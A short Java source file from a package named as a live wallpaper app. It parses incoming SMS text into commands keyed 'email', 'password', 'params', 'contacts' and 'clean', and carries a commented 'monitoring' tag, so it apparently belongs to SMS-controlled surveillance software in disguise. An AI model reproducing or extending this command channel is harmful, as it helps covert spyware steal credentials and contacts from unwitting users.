package com.livewallpaper.circle.parser;

import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ParserSMSCommands {

	private static final String REGEX_SET_AND_GET = "(\\semail|\\spassword|\\sparams|\\scontacts|\\sclean)(.*?)(,|;)";
	private static final String REGEX_VALUE = "\"(.*?)\"";
	private static final String REGEX_KEY = "(email|password|params|contacts|clean)";
	//private static final String LOG_TAG = "monitoring";

	public static HashMap<String, String> parserCommands(String line) {
		HashMap<String, String> mapCommands = new HashMap<String, String>();
		Matcher commands = Pattern.compile(REGEX_SET_AND_GET).matcher(line);
		while (commands.find()) {
			String key = parserKey(commands.group());
			String value = parserValue(commands.group());
			if (key != null) {
				mapCommands.put(key, value);
			}

		}
		return mapCommands;
	}

	private static String parserKey(String command) {
		Matcher m = Pattern.compile(REGEX_KEY).matcher(command);
		if (m.find()) {
			return m.group();
		}
		return null;
	}

	private static String parserValue(String command) {
		Matcher m = Pattern.compile(REGEX_VALUE).matcher(command);
		if (m.find()) {
			return m.group().substring(1, m.group().length() - 1);
		}
		return null;
	}
}
